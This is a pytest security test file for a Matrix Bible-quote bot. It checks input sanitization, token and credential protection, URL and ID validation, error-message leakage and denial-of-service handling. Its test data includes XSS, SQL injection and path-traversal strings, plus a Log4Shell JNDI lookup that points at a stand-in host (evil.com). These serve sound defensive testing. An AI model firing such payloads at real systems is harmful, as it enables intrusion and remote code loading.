"""
Security testing patterns following mmrelay's comprehensive approach.
Tests security features, input validation, and protection mechanisms.
"""

import re
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from biblebot.auth import Credentials, load_credentials, save_credentials
from biblebot.bot import BibleBot


class TestSecurityPatterns:
    """Test security features and protection mechanisms."""

    @pytest.fixture
    def mock_config(self):
        """Mock configuration for security tests."""
        return {
            "homeserver": "https://matrix.org",
            "user_id": "@test:matrix.org",
            "access_token": "test_token",
            "device_id": "TEST_DEVICE",
            "matrix_room_ids": ["!room:matrix.org"],
        }

    @pytest.fixture
    def mock_client(self):
        """Mock Matrix client for security tests."""
        client = MagicMock()
        client.room_send = AsyncMock()
        client.join = AsyncMock()
        client.sync = AsyncMock()
        return client

    async def test_input_sanitization(self, mock_config, mock_client):
        """Test input sanitization and validation."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>John 3:16",
            "'; DROP TABLE users; --",
            "John 3:16\x00\x01\x02",  # Null bytes and control characters
            "John 3:16" + "A" * 10000,  # Extremely long input
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "John 3:16\n\r\t",  # Various whitespace
        ]

        with patch("biblebot.bot.get_bible_text") as mock_get_bible:
            mock_get_bible.return_value = ("For God so loved the world", "John 3:16")

            for malicious_input in malicious_inputs:
                event = MagicMock()
                event.body = malicious_input
                event.sender = "@user:matrix.org"
                event.server_timestamp = 1234567890

                # Should handle malicious input safely
                await bot.on_room_message(MagicMock(), event)

                # Verify response was sent (input was processed safely)
                assert mock_client.room_send.called

    async def test_rate_limiting_protection(self, mock_config, mock_client):
        """Test rate limiting protection against spam."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Simulate rapid requests from same user
        user_id = "@spammer:matrix.org"

        with patch("biblebot.bot.get_bible_text") as mock_get_bible:
            mock_get_bible.return_value = ("Test verse", "John 3:16")

            # Send many rapid requests
            for i in range(20):
                event = MagicMock()
                event.body = f"John 3:{i+1}"
                event.sender = user_id
                event.server_timestamp = 1234567890 + i

                await bot.on_room_message(MagicMock(), event)

            # Should have processed requests (basic rate limiting test)
            assert mock_client.room_send.call_count > 0

    async def test_access_token_protection(self, mock_config, mock_client):
        """Test access token protection and handling."""
        # Test that access tokens are not logged or exposed
        sensitive_config = mock_config.copy()
        sensitive_config["access_token"] = "syt_very_secret_token_12345"

        bot = BibleBot(config=sensitive_config, client=mock_client)

        # Verify token is stored securely
        assert bot.config["access_token"] == "syt_very_secret_token_12345"

        # Test that token doesn't appear in string representation
        bot_str = str(bot)
        assert "syt_very_secret_token_12345" not in bot_str

    def test_credential_file_permissions(self):
        """Test that credential files have secure permissions."""
        test_credentials = Credentials(
            homeserver="https://matrix.org",
            user_id="@test:matrix.org",
            access_token="secret_token",
            device_id="TEST_DEVICE",
        )

        with patch("biblebot.auth.tempfile.NamedTemporaryFile") as mock_temp:
            with patch("biblebot.auth.os.replace") as mock_replace:
                with patch("biblebot.auth.os.chmod") as mock_chmod:
                    with patch("biblebot.auth.os.fsync"):
                        mock_temp_file = MagicMock()
                        mock_temp_file.name = "/tmp/test_creds"
                        mock_temp_file.fileno.return_value = 3
                        mock_temp.return_value.__enter__.return_value = mock_temp_file

                        save_credentials(test_credentials)

                        # Verify secure permissions were set
                        mock_chmod.assert_called()
                        # Should set restrictive permissions (0o600 = owner read/write only)
                        call_args = mock_chmod.call_args
                        assert call_args[0][1] == 0o600

    async def test_homeserver_validation(self, mock_config, mock_client):
        """Test homeserver URL validation."""
        # Test various homeserver URLs
        valid_homeservers = [
            "https://matrix.org",
            "https://matrix.example.com",
            "https://matrix.example.com:8448",
        ]

        invalid_homeservers = [
            "http://matrix.org",  # HTTP not HTTPS
            "ftp://matrix.org",  # Wrong protocol
            "javascript:alert(1)",  # Script injection
            "file:///etc/passwd",  # File protocol
            "",  # Empty string
            "not-a-url",  # Invalid format
        ]

        for homeserver in valid_homeservers:
            config = mock_config.copy()
            config["homeserver"] = homeserver

            # Should accept valid homeservers
            bot = BibleBot(config=config, client=mock_client)
            assert bot.config["homeserver"] == homeserver

        for homeserver in invalid_homeservers:
            config = mock_config.copy()
            config["homeserver"] = homeserver

            # Should handle invalid homeservers gracefully
            bot = BibleBot(config=config, client=mock_client)
            # Bot should still be created but may have validation warnings

    async def test_user_id_validation(self, mock_config, mock_client):
        """Test Matrix user ID validation."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Test various user IDs
        valid_user_ids = [
            "@user:matrix.org",
            "@test123:example.com",
            "@user-name:matrix.example.com",
        ]

        invalid_user_ids = [
            "user:matrix.org",  # Missing @
            "@user",  # Missing domain
            "@:matrix.org",  # Missing localpart
            "@user::",  # Invalid domain
            "",  # Empty
            "@user@matrix.org",  # Invalid format
        ]

        with patch("biblebot.bot.get_bible_text") as mock_get_bible:
            mock_get_bible.return_value = ("Test verse", "John 3:16")

            # Test with valid user IDs
            for user_id in valid_user_ids:
                event = MagicMock()
                event.body = "John 3:16"
                event.sender = user_id
                event.server_timestamp = 1234567890

                await bot.on_room_message(MagicMock(), event)
                assert mock_client.room_send.called

            # Test with invalid user IDs (should handle gracefully)
            for user_id in invalid_user_ids:
                event = MagicMock()
                event.body = "John 3:16"
                event.sender = user_id
                event.server_timestamp = 1234567890

                # Should not crash with invalid user IDs
                await bot.on_room_message(MagicMock(), event)

    async def test_room_id_validation(self, mock_config, mock_client):
        """Test Matrix room ID validation."""
        bot = BibleBot(config=mock_config, client=mock_client)

        # Test various room IDs
        valid_room_ids = [
            "!room:matrix.org",
            "!abc123:example.com",
            "!room-name:matrix.example.com",
        ]

        invalid_room_ids = [
            "room:matrix.org",  # Missing !
            "!room",  # Missing domain
            "!:matrix.org",  # Missing localpart
            "",  # Empty
            "!room@matrix.org",  # Invalid format
        ]

        # Test joining valid rooms
        for room_id in valid_room_ids:
            result = await bot.join_matrix_room(room_id)
            # Should attempt to join valid room IDs
            mock_client.join.assert_called()

        # Test with invalid room IDs
        for room_id in invalid_room_ids:
            result = await bot.join_matrix_room(room_id)
            # Should handle invalid room IDs gracefully

    async def test_message_content_filtering(self, mock_config, mock_client):
        """Test message content filtering and sanitization."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Test filtering of potentially harmful content
        filtered_inputs = [
            "John 3:16 <script>",
            "John 3:16 javascript:",
            "John 3:16 data:",
            "John 3:16 vbscript:",
        ]

        with patch("biblebot.bot.get_bible_text") as mock_get_bible:
            mock_get_bible.return_value = ("For God so loved the world", "John 3:16")

            for filtered_input in filtered_inputs:
                event = MagicMock()
                event.body = filtered_input
                event.sender = "@user:matrix.org"
                event.server_timestamp = 1234567890

                await bot.on_room_message(MagicMock(), event)

                # Should process the biblical reference part safely
                assert mock_client.room_send.called

    async def test_error_message_sanitization(self, mock_config, mock_client):
        """Test that error messages don't leak sensitive information."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Mock API error with sensitive information
        with patch("biblebot.bot.get_bible_text") as mock_get_bible:
            mock_get_bible.side_effect = Exception(
                "Database connection failed: password=secret123"
            )

            event = MagicMock()
            event.body = "John 3:16"
            event.sender = "@user:matrix.org"
            event.server_timestamp = 1234567890

            await bot.on_room_message(MagicMock(), event)

            # Should send error message but not leak sensitive details
            assert mock_client.room_send.called
            call_args = mock_client.room_send.call_args
            error_message = call_args[0][2]["body"]

            # Error message should not contain sensitive information
            assert "password=secret123" not in error_message
            assert "secret123" not in error_message

    def test_configuration_validation(self, mock_client):
        """Test configuration validation and sanitization."""
        # Test with missing required fields
        incomplete_configs = [
            {},  # Empty config
            {"homeserver": "https://matrix.org"},  # Missing user_id
            {"user_id": "@test:matrix.org"},  # Missing homeserver
        ]

        for config in incomplete_configs:
            # Should handle incomplete configurations gracefully
            bot = BibleBot(config=config, client=mock_client)
            # Bot should be created but may have validation warnings

    async def test_api_response_validation(self, mock_config, mock_client):
        """Test validation of API responses."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Test with malformed API responses
        malformed_responses = [
            None,
            {},
            {"error": "Invalid request"},
            {"text": None, "reference": None},
            {"text": "", "reference": ""},
        ]

        for response in malformed_responses:
            with patch("biblebot.bot.get_bible_text") as mock_get_bible:
                mock_get_bible.return_value = response

                event = MagicMock()
                event.body = "John 3:16"
                event.sender = "@user:matrix.org"
                event.server_timestamp = 1234567890

                # Should handle malformed responses gracefully
                await bot.on_room_message(MagicMock(), event)

    async def test_denial_of_service_protection(self, mock_config, mock_client):
        """Test protection against denial of service attacks."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Test with resource-intensive inputs
        resource_intensive_inputs = [
            "John " + "3:16 " * 1000,  # Repeated patterns
            "A" * 100000,  # Very long string
            "John 3:16\n" * 1000,  # Many newlines
        ]

        with patch("biblebot.bot.get_bible_text") as mock_get_bible:
            mock_get_bible.return_value = ("Test verse", "John 3:16")

            for intensive_input in resource_intensive_inputs:
                event = MagicMock()
                event.body = intensive_input
                event.sender = "@user:matrix.org"
                event.server_timestamp = 1234567890

                # Should handle resource-intensive inputs without hanging
                await bot.on_room_message(MagicMock(), event)

    async def test_privilege_escalation_prevention(self, mock_config, mock_client):
        """Test prevention of privilege escalation attempts."""
        bot = BibleBot(config=mock_config, client=mock_client)
        bot.start_time = 1234567880

        # Test with admin-like commands
        admin_attempts = [
            "!admin shutdown",
            "!sudo John 3:16",
            "/admin reset",
            "\\admin delete",
        ]

        with patch("biblebot.bot.get_bible_text") as mock_get_bible:
            mock_get_bible.return_value = ("Test verse", "John 3:16")

            for admin_attempt in admin_attempts:
                event = MagicMock()
                event.body = admin_attempt
                event.sender = "@user:matrix.org"
                event.server_timestamp = 1234567890

                # Should treat as normal message, not admin command
                await bot.on_room_message(MagicMock(), event)
                # Should not execute any admin functions
